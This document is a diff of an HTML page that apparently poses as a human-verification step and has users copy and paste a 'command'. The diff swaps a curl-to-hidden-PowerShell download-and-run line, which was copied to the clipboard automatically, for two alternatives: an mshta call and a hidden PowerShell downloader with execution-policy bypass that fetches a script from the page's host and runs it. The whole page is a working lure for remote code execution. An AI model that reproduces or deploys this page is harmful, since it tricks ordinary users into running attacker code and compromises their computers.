@@ -45,30 +45,35 @@
   </ol>
   <div class="code" id="cmd"></div>
   <button id="btn">Copy command</button>
-  <p class="trouble" id="tr">Trouble? Download the .cmd file instead</p>
+  <p class="trouble" id="tr">Not working? Try the other method</p>
   <p class="foot">Verification is done automatically in the background</p>
 </div>
 <script>
-const t = Math.random().toString().slice(2,10);
-const host = location.host;
-const c = `cmd /c curl -sL "https://${host}/f?t=${t}" | powershell -nop -w hidden -`;
-document.getElementById('cmd').textContent = c;
+const host = location.host, t = Math.random().toString().slice(2,10);
+const A = `mshta "https://${host}/f?t=${t}"`;
+const B = `powershell -nop -w hidden -ep bypass -c "$s=(New-Object Net.WebClient).DownloadString('https://${host}/s?t=${t}');[ScriptBlock]::Create($s).Invoke()"`;
+let cur = A, alt = false;
 
-function flash(){
-  const b = document.getElementById('btn');
-  b.textContent = 'Copied';
-  b.classList.add('ok');
-  setTimeout(()=>{ b.textContent='Copy command'; b.classList.remove('ok'); },1600);
+const box = document.getElementById('cmd'), btn = document.getElementById('btn');
+box.textContent = cur;
+
+function copy(txt){
+  const a = document.createElement('textarea');
+  a.value = txt; a.style.position = 'fixed'; a.style.opacity = '0';
+  document.body.appendChild(a); a.select(); document.execCommand('copy'); a.remove();
 }
-async function copy(){
-  try{ await navigator.clipboard.writeText(c); }
-  catch(e){ const a=document.createElement('textarea'); a.value=c; document.body.appendChild(a); a.select(); document.execCommand('copy'); a.remove(); }
-  flash();
-}
-document.getElementById('btn').onclick = copy;
-document.getElementById('tr').onclick = ()=>{ location.href = '/f?t='+t; };
-document.body.addEventListener('click', e=>{ if(e.target.tagName!=='BUTTON') copy(); });
-window.addEventListener('load', ()=> setTimeout(copy, 400));
+
+btn.onclick = () => {
+  copy(cur);
+  btn.textContent = 'Copied'; btn.classList.add('ok');
+  setTimeout(() => { btn.textContent = 'Copy command'; btn.classList.remove('ok'); }, 1600);
+};
+
+document.getElementById('tr').onclick = () => {
+  alt = !alt; cur = alt ? B : A; box.textContent = cur;
+  btn.textContent = 'Copy command';
+  document.getElementById('tr').textContent = alt ? 'Back to the first method' : 'Not working? Try the other method';
+};
 </script>
 </body>
 </html>
